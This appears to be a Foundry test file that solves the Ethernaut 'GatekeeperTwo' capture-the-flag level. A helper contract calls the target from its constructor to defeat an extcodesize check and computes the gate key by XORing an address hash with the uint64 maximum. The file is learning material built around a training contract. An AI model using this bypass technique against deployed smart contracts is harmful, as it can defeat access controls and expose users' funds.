// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/GatekeeperTwo.sol";

// exploit constructor s.t. extcodesize() is 0. Reverse cal. the answer directly
contract MiddleMan {
    constructor(address prey) {
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        GatekeeperTwo(prey).enter(gateKey);
    }
}

contract GatekeeperTwoTest is Test {
    // GatekeeperTwo instance = GatekeeperTwo(vm.envAddress("GATEKEEPER_TWO"));
    GatekeeperTwo instance;

    function setUp() public {
        instance = new GatekeeperTwo();
    }

    function test() public {
        new MiddleMan(address(instance));
        assertEq(instance.entrant(), msg.sender);
    }
}
